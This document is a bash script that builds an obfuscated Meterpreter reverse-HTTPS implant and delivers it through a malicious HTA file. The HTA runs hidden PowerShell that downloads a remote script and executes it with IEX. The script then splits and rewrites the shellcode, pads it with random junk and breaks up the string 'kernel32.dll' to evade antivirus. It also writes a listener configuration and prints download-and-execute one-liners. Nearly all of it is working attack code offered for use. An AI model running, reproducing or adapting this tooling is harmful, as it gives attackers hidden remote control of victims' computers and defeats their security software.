#!/bin/bash
# shellcode replacement stuff
# meterpreter PSH-NET payload combined with hta-psh web delivery method
# darksh3llRU beta v1.0, last update 26.06.2020
# before you start comment and uncomment correct payload to use and options to be used
# staged payload doesnt really support proxy, second stage will not arrive via proxy it require msf template changes
# stageless payload are splitted as you want, junk is random, but places where to put junk can be extended
# Customize user agent if required
# use nginx reverse proxy to catch session

# payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
payload="windows/x64/meterpreter_reverse_https"             #stageless
#payload="windows/x64/meterpreter/reverse_https"            #staged
ListenerIP=192.168.114.26
ListenerPort=443
ListenerURI="/logout/"
ProxyType=HTTP
ProxyHost=""
ProxyPort=""
ProxyUser=""
ProxyPass=""
declare "UserAgent"="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'"
DownloadURL="http://10.0.8.4:8080"

# WEB DELIVERY HTA
# just raw hta-psh, no need for real options
hta_exploit="msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=443 -f hta-psh -o user_settings.hta"
printf "Creating dumb HTA-PSH payload:\n$hta_exploit...\n"
$hta_exploit


# example of hta_payload template !CUSTOMIZE IT IF NEEDED!
# AWARE of escaping in bash!
printf "Creating hta payload...\n"
printf "if([IntPtr]::Size -eq 4)" > hta_payload.txt
printf "{\$babushka=\$env:windir+'\sysnative\WindowsPowerShell\\\v1.0\powershell.exe'}else{\$babushka='powershell.exe'};" >> hta_payload.txt
printf "\$samosval=New-Object System.Diagnostics.ProcessStartInfo;" >> hta_payload.txt
printf "\$samosval.FileName=\$babushka;" >> hta_payload.txt
printf "\$samosval.Arguments=\"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR $DownloadURL/final_pshnet_revhttps.ps1 -UserAgent 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'|IEX\";" >> hta_payload.txt
printf "\$samosval.UseShellExecute=\$false;" >> hta_payload.txt
printf "\$samosval.RedirectStandardOutput=\$false;" >> hta_payload.txt
printf "\$samosval.WindowStyle='Hidden';" >> hta_payload.txt
printf "\$samosval.CreateNoWindow=\$false;" >> hta_payload.txt
printf "\$traktor=[System.Diagnostics.Process]::Start(\$samosval);" >> hta_payload.txt

# convert hta_payload template to base64 utf-16le
cat hta_payload.txt | iconv -f ascii -t utf-16le | base64 | tr -d '\n' > hta_payload.base64.txt
hta_payload_base64=$(<hta_payload.base64.txt)
printf "Generated base64 encoded:\n$hta_payload_base64\n"

# change base64 payload to our template
sed -i "s,hidden -e\(.*\)\",hidden -Exec Bypass -e $hta_payload_base64\",g" user_settings.hta
printf "Hta exploit file updated with encoded payload pointing to $DownloadURL/final_pshnet_revhttps.ps1\n"

# METERPRETER STAGE2
# PSH-NET payload options one liner
# reverse_https with proxy settings stageless only
payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpProxyType=$ProxyType HttpProxyHost=$ProxyHost HttpProxyPort=$ProxyPort HttpProxyUser=$ProxyUser HttpProxyPass=$ProxyPass HttpUserAgent=$UserAgent"
# reverse https without proxy setting staged only
#payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpUserAgent=$UserAgent OverrideLHOST=$ListenerIP OverrideLPORT=$ListenerPort OverrideRequestHost=true"
printf "\nPayload and options used:\n$payload\n$payload_options\n...\n"

# generate payload
raw_payload="msfvenom -p $payload $payload_options -f psh-net -o raw_pshnet_revhttps.ps1"
printf "Generating payload with msfvenom:\n$raw_payload\n...\n"
$raw_payload

# raw payload usage
printf "Raw psh-net usage example:\n"
printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/raw_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"

# extract base64 encoded string, decode, convert to binary format for the future update
printf "Extracting, decoding and converting shellcode:\n...\n"
cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o '".*"' | sed 's/"//g' > raw_pshnet_revhttps.base64.txt
base64 -d raw_pshnet_revhttps.base64.txt | xxd -p | tr -d '\n'  > raw_pshnet_revhttps.hex.txt
printf "Original shellcode raw_pshnet_revhttps.hex.txt, modify and put back into the file named final_pshnet_revhttps.hex.txt\n"

# shellcode modification section
# n00b shellcode copy paste -> emulation for shellcode modification !!!SWITCH OFF FOR REAL!!!
cp raw_pshnet_revhttps.hex.txt final_pshnet_revhttps.hex.txt
read -p "Press any key to continue when modified shellcode file is ready..." -n1 -s

# base64 encode the shellcode and put it into ps file
printf "\nStarting converting, encoding and updating final ps1 file...\n"
xxd -p -r final_pshnet_revhttps.hex.txt | base64 | tr -d '\n' > final_pshnet_revhttps.base64.txt
# prepare to shellcode change
raw_shellcode=$(<raw_pshnet_revhttps.base64.txt)
eleet_shellcode=$(<final_pshnet_revhttps.base64.txt)
printf "Old shellcode:\n$raw_shellcode"
printf "\nNew shellcode:\n$eleet_shellcode"

# ps1 obfuscation, replacements etc
chunk_size=1337
printf "\nSplitting shellcode in chunks with size $chunksize"
cp raw_pshnet_revhttps.ps1 final_pshnet_revhttps.ps1
# determine shellcode size, split by chunk_size in the cycle and put to the array
shellcode_size=${#eleet_shellcode}
printf "DEBUG: Shellcode size is $shellcode_size\n"
shellcode_parts=$(($shellcode_size/$chunk_size))
printf "DEBUG: shellcode will be splited into $shellcode_parts+1 parts\n"

y=0 
for (( i=0; i <=$shellcode_parts; i++))
do
    shellcode_chunks[$i]=$(echo ${eleet_shellcode:$y:$chunk_size})
    y=$(($y+$chunk_size))
done
printf "DEBUG: shellcode chunks are printed:\n"
printf "${shellcode_chunks[*]}\n"
printf "DEBUG: shellcode chunks are correct?\n"

# insert shellcode_chunks before call to encoded shellcode
for (( x=0; x <=$shellcode_parts; x++))
do
    sed -i "/CompileAssemblyFromSource/a \$sc$x=\"${shellcode_chunks[$x]}\"" final_pshnet_revhttps.ps1
    sed -i "/CompileAssemblyFromSource/G" final_pshnet_revhttps.ps1
    sc_concat+="\$sc$x+"
done

# last + remove trick
sc_concat=${sc_concat%?}
printf "DEBUG: changing base64 string to $sc_concat\n"

# change base64 encoded shellcode with sc_concat variable
raw_shellcode_start=$(echo $raw_shellcode | head -c $(($chunk_size*2)))
sed -i "s,\"$raw_shellcode_start\(.*\)\",$sc_concat,g" final_pshnet_revhttps.ps1


# extract lines from 2 to 15 and save it as variable
sed -i -e '2,15 {w loader.txt
d}' final_pshnet_revhttps.ps1
loader=$(<loader.txt)

# generate junk string
junk_size=1337
declare "junk_string"="#$(cat /dev/urandom | tr -dc '(\&\_a-zA-Z0-9\^\*\@' | fold -w ${1:-$junk_size} | head -n 1)"
#printf "DEBUG Junk string:\n"
#printf "$junk_string\n"

# fill every empty line with junk string
printf "DEBUG Filling final_pshnet_revhttps.ps1 with junk...\n"
sed -i -e "s,^,$junk_string\n," final_pshnet_revhttps.ps1

# insert loader back and fill with junk a bit before it
printf "DEBUG inserting loader back...\n"
sed -i "/Set-StrictMode -Version 2/r loader.txt" final_pshnet_revhttps.ps1
for (( z=0; z <=$shellcode_parts; z++))
do
    sed -i "2i $junk_string" final_pshnet_revhttps.ps1
done

# do kernel32.dll things
sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttps.ps1

printf "Final psh-net usage example:\n"
printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"

# creating multu handler listener file
printf "Creating multi handler script file...\n"
printf "use exploit/multi/handler\n" > multihandler.rc
printf "set PAYLOAD $payload\n" >> multihandler.rc
printf "set LHOST $ListenerIP\n" >> multihandler.rc
printf "set LPORT $ListenerPort\n" >> multihandler.rc
printf "set LURI $ListenerURI\n" >> multihandler.rc
printf "set HttpProxyType $ProxyType\n" >> multihandler.rc
printf "set HttpProxyHost $ProxyHost\n" >> multihandler.rc
printf "set HttpProxyPort $ProxyPort\n" >> multihandler.rc
printf "set HttpProxyUser $ProxyUser\n" >> multihandler.rc
printf "set HttpProxyPass $ProxyPass\n" >> multihandler.rc
printf "set HttpUserAgent $UserAgent\n" >> multihandler.rc
printf "set OverrideLHOST $ListenerIP\n" >> multihandler.rc
printf "set OverrideLPORT $ListenerPort\n" >> multihandler.rc
printf "set OverrideRequestHost true\n" >> multihandler.rc
printf "set exitonsession false\n" >> multihandler.rc
printf "exploit -j -z\n" >> multihandler.rc
printf "Run listener: msfconsole -r multihandler.rc\n"

printf "Use user_settings.hta to deliver meterpreter payload to user\n"
